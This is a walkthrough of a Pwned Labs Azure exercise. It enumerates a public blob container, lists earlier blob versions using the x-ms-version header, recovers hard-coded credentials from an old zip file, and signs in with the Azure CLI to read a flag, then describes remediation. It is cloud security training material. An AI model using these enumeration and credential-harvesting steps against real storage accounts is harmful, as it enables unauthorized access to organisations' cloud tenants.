---
title: Azure Blob Container to Initial Access
description: Azure Blob Container to Initial Access
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario

Mega Big Tech have adopted a hybrid cloud architecture and continues to use a local on-premise Active Directory domain, as well as the Azure cloud. They are wary of being targeted due to their importance in the tech world, and have asked your team to assess the security of their infrastructure, including cloud services. An interesting URL has been found in some public documentation, and you are tasked with assessing it.

Learning outcomes:


- Familiarity with the Azure CLI
- Identification and enumeration of Azure Blob Container
- Leverage blob previous version functionality to reveal secrets
- Understand how this attack chain could have been prevented

# Walkthrough
We are given URL: `http://dev.megabigtech.com/$web/index.html`. Let's check the content. It seems like it's a static page.

![](azure-blob-container-to-initial-access-1.png)

The page includes static files from [Azure Blob Storage](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction), which is Microsoft's object storage solution for the cloud. This can be confirmed by [endpoint format](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/az-storage.html#storage-endpoints)

![](azure-blob-container-to-initial-access-2.png)

We can also try accessing `https://mbtwebsite.blob.core.windows.net/$web/index.html` to confirm that site is hosted on Azure Blob Storage. This can also be confirmed via `curl` (`Server: Blob Service Version 1.0 Microsoft-HTTPAPI/2.0` header) or `Invoke-WebRequest` (`x-ms-blob-type: BlockBlob` header)
```
└─$ curl -I https://mbtwebsite.blob.core.windows.net/$web/index.html                                                       
HTTP/1.1 400 One of the request inputs is out of range.
Transfer-Encoding: chunked
Server: Blob Service Version 1.0 Microsoft-HTTPAPI/2.0
x-ms-request-id: 2132b9e2-801e-0010-2870-058957000000
Date: Mon, 04 Aug 2025 18:49:27 GMT
```
```
└─PS> Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers
                                                                                                                        
Key               Value
---               -----
ETag              {0x8DBD1A84E6455C0}
Server            {Windows-Azure-Blob/1.0, Microsoft-HTTPAPI/2.0}
x-ms-request-id   {01973c31-b01e-0024-2470-05ba9f000000}
x-ms-version      {2009-09-19}
x-ms-lease-status {unlocked}
x-ms-blob-type    {BlockBlob}
Date              {Mon, 04 Aug 2025 18:50:06 GMT}
Content-Length    {782359}
Content-Type      {text/html}
Content-MD5       {JSe+sM+pXGAEFInxDgv4CA==}
Last-Modified     {Fri, 20 Oct 2023 20:08:20 GMT}
```

We can continue examining Azure Blob Storage. It [consists of several parts](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction#blob-storage-resources)

![](azure-blob-container-to-initial-access-3.png)

Based on [Microsoft documentation](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction#blob-storage-resources), we can digest `https://mbtwebsite.blob.core.windows.net/$web/index.html`

- `https`: Protocol
- `mbtwebsite`: [Storage account name](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction#storage-accounts)
- `blob.core.windows.net`: [Azure Storage service endpoint](https://learn.microsoft.com/en-us/azure/storage/common/storage-account-overview?toc=%2Fazure%2Fstorage%2Fblobs%2Ftoc.json&bc=%2Fazure%2Fstorage%2Fblobs%2Fbreadcrumb%2Ftoc.json#standard-endpoints)
- `$web`: [Container name](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction#containers)
- `index.html`: file requested

We can use the following [documentation](https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=microsoft-entra-id) to enumerate Azure Blob Storage. 

Let's list the blobs and directories
```
https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list
```
```
https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&delimiter=%2F
```

![](azure-blob-container-to-initial-access-4.png)

Nothing interesting, but we can try checking for [blob versioning](https://learn.microsoft.com/en-us/azure/storage/blobs/versioning-overview), which is maintains previous versions of a blob.
```
https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions
```
If we try checking for versions, we get an error. It seems like based on [documentation](https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=microsoft-entra-id#uri-parameters) `include=versions` parameter is supported by version `2019-12-12` 

![](azure-blob-container-to-initial-access-5.png)

We can specify it by setting the `x-ms-version` header
```
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format - | less
```

We find blob `scripts-transfer.zip` and the version ID that we can use to download

![](azure-blob-container-to-initial-access-6.png)

```
└─$ curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-02-18T00:29:19.3854225Z' --output scripts-transfer.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1606  100  1606    0     0   1945      0 --:--:-- --:--:-- --:--:--  1944
```

Content of the zip archive
```
└─$ unzip scripts-transfer.zip             
Archive:  scripts-transfer.zip
  inflating: entra_users.ps1         
  inflating: stale_computer_accounts.ps1
```

Inside we find credentials

![](azure-blob-container-to-initial-access-7.png)

We can try both credentials, but only `marcus@megabigtech.com` works
```
└─$ az login -u marcus@megabigtech.com -p '<REDACTED>'   
Starting September 1, 2025, MFA will be gradually enforced for Azure public cloud. The authentication with username and password in the command line is not supported with MFA. Consider using one of the compatible authentication methods. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314                                                                                                                                                                      
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
    "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Microsoft Azure Sponsorship",
    "state": "Enabled",
    "tenantDefaultDomain": "megabigtech.com",
    "tenantDisplayName": "Default Directory",
    "tenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
    "user": {
      "name": "marcus@megabigtech.com",
      "type": "user"
    }
  }
]
```
```
$Username = "marcus@megabigtech.com"
$Password = "<REDACTED>" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)
Connect-AzAccount -Credential $Credential
```

To get the flag
```
└─$ az ad signed-in-user show
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "businessPhones": [],
  "displayName": "Marcus Hutch",
  "givenName": "Marcus",
  "id": "41c178d3-c246-4c00-98f0-8113bd631676",
  "jobTitle": "Flag: <REDACTED>",
  "mail": null,
  "mobilePhone": null,
  "officeLocation": null,
  "preferredLanguage": null,
  "surname": "Hutch",
  "userPrincipalName": "marcus@megabigtech.com"
}
```
```
Get-AzADUser -SignedIn | fl
```

## Remediation
This section is from [Walkthrough section](https://pwnedlabs.io/labs/azure-blob-container-to-initial-access) of the lab.

The entire blob container is accessible by anonymous users and world-readable, when just the website files should have been configured to be publicly accessible.

![](azure-blob-container-to-initial-access-8.png)

This means that a previous version of a sensitive file was also publicly discoverable and readable. To mitigate this issue, the previous version should be deleted.

![](azure-blob-container-to-initial-access-9.png)

To do it via Azure CLI, the following command could be used after setting the storage account context with `Set-AzCurrentStorageAccount`
```
Remove-AzStorageBlob -Container '$web' -Blob scripts-transfer.zip -VersionId "2024-03-29T20:55:40.8265593Z"
```

Moreover, it's not recommended to hard-code credentials in scripts. Credentials should be stored in a PAM (Privileged Access Management) system, password manager or using a service such as Azure Key Vault. Key Vault allows you to securely store and access keys, passwords, certificates, and other secrets. 

Check other [community walkthroughs](https://youtu.be/L0eM8RCqJV0)